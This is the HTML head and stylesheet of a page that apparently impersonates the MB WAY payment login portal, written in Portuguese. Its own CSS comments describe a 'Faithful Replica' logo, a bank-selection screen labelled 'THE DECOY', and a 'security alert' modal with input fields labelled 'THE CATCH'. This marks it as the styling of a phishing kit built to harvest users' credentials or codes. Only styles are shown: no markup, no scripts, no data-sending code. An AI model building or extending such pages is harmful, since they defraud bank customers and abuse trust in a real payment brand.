<!DOCTYPE html>
<html lang="pt-PT">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MB WAY - Portal de Acesso</title>
    <style>
        :root {
            --mb-red: #E60000;
            --mb-black: #1A1A1A;
            --mb-bg-gray: #F0F0F0;
            --mb-white: #FFFFFF;
            --mb-text-muted: #666666;
            --mb-link-blue: #0056B3;
            --mb-border: #DDDDDD;
            --mb-btn-disabled: #E0E0E0;
            --mb-btn-active: #1A1A1A;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: var(--mb-bg-gray); color: var(--mb-black); }

        /* Container Mobile */
        .app-container {
            max-width: 414px;
            margin: 0 auto;
            min-height: 100vh;
            background: var(--mb-white);
            position: relative;
            overflow: hidden;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
        }

        /* --- SCREEN 1: LOGIN (CURVED BACKGROUND) --- */
        .screen-login {
            display: flex;
            flex-direction: column;
            height: 100vh;
            position: relative;
        }

        .login-bg-curve {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 45%;
            background-color: var(--mb-bg-gray);
            border-bottom-right-radius: 50% 100%;
            z-index: 0;
        }

        .login-content {
            position: relative;
            z-index: 1;
            display: flex;
            flex-direction: column;
            height: 100%;
            padding: 20px;
        }

        /* Header Top */
        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding-top: 10px;
        }

        .lang-selector {
            display: flex;
            align-items: center;
            gap: 4px;
            font-size: 14px;
            font-weight: 600;
            color: var(--mb-black);
            background: none;
            border: none;
            cursor: pointer;
        }

        /* Logo MB WAY (Faithful Replica) */
        .logo-container {
            margin-top: 60px;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
        }

        .logo-mb {
            font-size: 48px;
            font-weight: 900;
            font-style: italic;
            color: var(--mb-black);
            position: relative;
            padding: 5px 10px;
        }

        .logo-mb::before, .logo-mb::after {
            content: '';
            position: absolute;
            width: 4px;
            height: 60%;
            background-color: var(--mb-red);
            border-radius: 2px;
        }

        .logo-mb::before { left: 0; top: 20%; }
        .logo-mb::after { right: 0; top: 20%; }

        .logo-way {
            font-size: 48px;
            font-weight: 900;
            font-style: italic;
            color: var(--mb-black);
            margin-left: 5px;
        }

        .instruction-text {
            text-align: center;
            margin-top: 40px;
            font-size: 16px;
            color: var(--mb-black);
            line-height: 1.4;
        }

        /* Phone Input Field */
        .phone-input-wrapper {
            margin-top: 30px;
            display: flex;
            align-items: center;
            border-bottom: 1px solid var(--mb-border);
            padding-bottom: 8px;
        }

        .flag-selector {
            display: flex;
            align-items: center;
            gap: 6px;
            padding-right: 12px;
            border-right: 1px solid var(--mb-border);
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
        }

        .flag-icon {
            width: 20px;
            height: 14px;
            background: linear-gradient(to right, #006600 33%, #fff 33%, #fff 66%, #FF0000 66%);
            border: 1px solid #ccc;
            border-radius: 2px;
        }

        .phone-number-input {
            flex: 1;
            border: none;
            font-size: 16px;
            padding: 10px;
            outline: none;
        }

        .phone-number-input::placeholder { color: #999; }

        /* Button */
        .btn-continue {
            margin-top: 30px;
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 8px;
            background-color: var(--mb-btn-disabled);
            color: white;
            font-weight: bold;
            font-size: 16px;
            text-transform: uppercase;
            cursor: not-allowed;
            transition: background-color 0.3s;
        }

        .btn-continue.active {
            background-color: var(--mb-btn-active);
            cursor: pointer;
        }

        /* Footer */
        .footer-terms {
            margin-top: auto;
            margin-bottom: 20px;
            text-align: center;
            font-size: 11px;
            color: var(--mb-text-muted);
            line-height: 1.5;
            padding: 0 10px;
        }

        .footer-terms a {
            color: var(--mb-link-blue);
            text-decoration: underline;
        }

        /* --- SCREEN 2: BANK LIST (THE DECOY) --- */
        .screen-bank {
            display: none; /* Hidden initially */
            flex-direction: column;
            height: 100vh;
            background: var(--mb-white);
        }

        .bank-header {
            background: var(--mb-bg-gray);
            padding: 15px;
            display: flex;
            align-items: center;
            border-bottom: 1px solid var(--mb-border);
        }

        .back-arrow {
            font-size: 20px;
            cursor: pointer;
            padding: 5px;
        }

        .bank-title {
            flex: 1;
            text-align: center;
            font-weight: bold;
            font-size: 18px;
        }

        .bank-search {
            padding: 15px;
            border-bottom: 1px solid var(--mb-border);
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .bank-search input {
            border: none;
            flex: 1;
            font-size: 16px;
            outline: none;
        }

        .bank-list {
            flex: 1;
            overflow-y: auto;
        }

        .bank-item {
            display: flex;
            align-items: center;
            padding: 15px;
            border-bottom: 1px solid var(--mb-border);
            cursor: pointer;
        }

        .bank-item:hover { background-color: #f9f9f9; }

        .bank-logo-circle {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            margin-right: 15px;
            font-size: 14px;
        }

        .bank-name { flex: 1; font-size: 16px; }
        .bank-chevron { color: #999; font-size: 20px; }

        /* --- MODAL: SECURITY ALERT (THE CATCH) --- */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.6);
            z-index: 100;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .modal-content {
            background: white;
            width: 100%;
            max-width: 350px;
            border-radius: 12px;
            padding: 24px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
        }

        .modal-icon {
            text-align: center;
            font-size: 40px;
            margin-bottom: 15px;
        }

        .modal-title {
            text-align: center;
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 10px;
            color: var(--mb-black);
        }

        .modal-desc {
            font-size: 14px;
            color: var(--mb-text-muted);
            text-align: center;
            margin-bottom: 20px;
            line-height: 1.5;
        }

        .modal-input-group {
            margin-bottom: 15px;
        }

        .modal-label {
            display: block;
            font-size: 12px;
            font-weight: 600;
            margin-bottom: 5px;
            color: var(--mb-black);
        }

        .modal-input {
            width: 100%;
            padding: 12px;
            border: 1px solid var(--mb-border);
            border-radius: 6px;
            font-size: 16px;
        }

        .btn-modal {
            width: 100%;
            padding: 14px;
            background-color: var(--mb-btn-active);
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            font-size: 16px;
            margin-top: 10px;
            cursor: pointer;
        }

        .btn-modal:disabled { background-color: var(--mb-btn-disabled); cursor: not-allowed; }

        /* Success Screen */
        .screen-success {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            text-align: center;
            padding: 20px;
        }

        .success-icon { font-size: 60px; color: var(--mb-red); margin-bottom: 20px; }
        .success-title { font-size: 20px; font-weight: bold; margin-bottom: 10px; }
        .success-desc { font-size: 14px; color: var(--mb-text-muted); margin-bottom: 30px; }

    </style>
</head>
